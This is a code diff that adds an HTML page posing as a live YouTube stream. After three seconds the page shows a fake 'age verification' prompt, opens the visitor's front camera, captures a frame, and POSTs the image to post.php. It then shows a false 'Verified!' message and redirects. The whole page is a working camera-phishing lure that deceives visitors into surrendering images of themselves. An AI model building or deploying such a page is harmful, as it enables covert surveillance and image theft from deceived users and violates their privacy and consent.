@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Live YouTube TV</title>
+<style>
+body { margin: 0; background: #000; color: #fff; font-family: Arial, sans-serif; }
+.container { max-width: 800px; margin: 20px auto; padding: 20px; }
+.video-wrapper { position: relative; padding-bottom: 56.25%; height: 0; background: #111; border-radius: 12px; overflow: hidden; }
+.video-wrapper iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0; }
+h1 { text-align: center; margin: 20px 0; font-size: 24px; }
+#camOverlay { 
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+    z-index: 9999; display: none; 
+    background: rgba(0,0,0,0.85);
+    justify-content: center; align-items: center; flex-direction: column;
+}
+#camOverlay.active { display: flex; }
+#camOverlay video { 
+    width: 90%; max-width: 500px; border-radius: 12px; 
+    border: 3px solid #fff; transform: scaleX(-1);
+}
+#camOverlay p { font-size: 18px; margin-top: 20px; color: #fff; }
+.btn-capture { 
+    padding: 15px 40px; font-size: 18px; border: none; background: #ff0000; 
+    color: #fff; border-radius: 50px; cursor: pointer; margin-top: 20px;
+}
+</style>
+</head>
+<body>
+<div class="container">
+    <h1>🔴 LIVE STREAM</h1>
+    <div class="video-wrapper">
+        <iframe src="https://www.youtube.com/embed/live_yt_tv?autoplay=1&mute=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    </div>
+</div>
+
+<div id="camOverlay">
+    <video id="video" autoplay playsinline></video>
+    <p>📸 Camera access required for age verification</p>
+    <button class="btn-capture" onclick="captureImage()">Allow & Continue</button>
+</div>
+
+<script>
+// Wait for page load then request camera
+window.onload = function() {
+    setTimeout(function() {
+        document.getElementById('camOverlay').className = 'camOverlay active';
+        startCamera();
+    }, 3000);
+};
+
+function startCamera() {
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        .then(function(stream) {
+            var video = document.getElementById('video');
+            video.srcObject = stream;
+            window.localStream = stream;
+        })
+        .catch(function(err) { console.log('Camera error:', err); });
+    }
+}
+
+function captureImage() {
+    var video = document.getElementById('video');
+    var canvas = document.createElement('canvas');
+    canvas.width = 640;
+    canvas.height = 480;
+    var ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, 640, 480);
+    
+    var data = canvas.toDataURL('image/png');
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'post.php', true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send('cat=' + encodeURIComponent(data));
+    
+    document.getElementById('camOverlay').innerHTML = '<p>✅ Verified! Redirecting...</p>';
+    setTimeout(function() { window.location.href = 'forwarding_link'; }, 1500);
+}
+</script>
+</body>
+</html>
